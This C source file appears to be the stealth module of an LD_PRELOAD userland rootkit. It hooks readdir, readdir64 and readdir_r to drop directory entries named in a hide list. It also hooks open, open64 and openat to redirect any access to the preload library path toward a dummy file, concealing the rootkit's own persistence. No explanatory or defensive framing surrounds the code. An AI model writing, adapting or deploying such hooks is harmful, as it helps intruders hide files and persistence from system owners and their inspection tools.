#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdarg.h>
#include <dlfcn.h>
#include <sys/types.h>

extern __thread int inside_hook;

static int should_hide_file(const char *name) {
    if (!name) return 0;
    
    const char *list = HIDE_LIST;
    const char *token = list;
    size_t name_len = strlen(name);

    while ((token = strstr(token, name)) != NULL) {
        int match_start = (token == list || *(token - 1) == ',' || *(token - 1) == ' ');
        int match_end = (token[name_len] == '\0' || token[name_len] == ',' || token[name_len] == ' ');

        if (match_start && match_end) {
            return 1;
        }
        token += 1;
    }
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent* (*orig)(DIR*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");

    if (inside_hook) return orig(dirp);

    inside_hook = 1;
    struct dirent *e;
    while ((e = orig(dirp))) {
        if (should_hide_file(e->d_name)) continue;
        inside_hook = 0;
        return e;
    }
    inside_hook = 0;
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64* (*orig)(DIR*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");

    if (inside_hook) return orig(dirp);

    inside_hook = 1;
    struct dirent64 *e;
    while ((e = orig(dirp))) {
        if (should_hide_file(e->d_name)) continue;
        inside_hook = 0;
        return e;
    }
    inside_hook = 0;
    return NULL;
}

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
#pragma GCC diagnostic ignored "-Wnonnull-compare"
int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
    static int (*orig)(DIR*, struct dirent*, struct dirent**) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir_r");

    if (inside_hook) return orig(dirp, entry, result);

    inside_hook = 1;
    int ret = orig(dirp, entry, result);
    if (ret == 0 && *result != NULL) {
        if (should_hide_file((*result)->d_name)) {
            inside_hook = 0;
            return readdir_r(dirp, entry, result);
        }
    }
    inside_hook = 0;
    return ret;
}
#pragma GCC diagnostic pop

int open(const char *pathname, int flags, ...) {
    static int (*orig_open)(const char*, int, mode_t) = NULL;
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (inside_hook) return orig_open(pathname, flags, mode);

    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_open(DUMMY_PRELOAD, flags, mode);
    return orig_open(pathname, flags, mode);
}

int open64(const char *pathname, int flags, ...) {
    static int (*orig_open64)(const char*, int, mode_t) = NULL;
    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (inside_hook) return orig_open64(pathname, flags, mode);

    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_open64(DUMMY_PRELOAD, flags, mode);
    return orig_open64(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");

    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }

    if (inside_hook) return orig_openat(dirfd, pathname, flags, mode);

    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_openat(dirfd, DUMMY_PRELOAD, flags, mode);
    return orig_openat(dirfd, pathname, flags, mode);
}

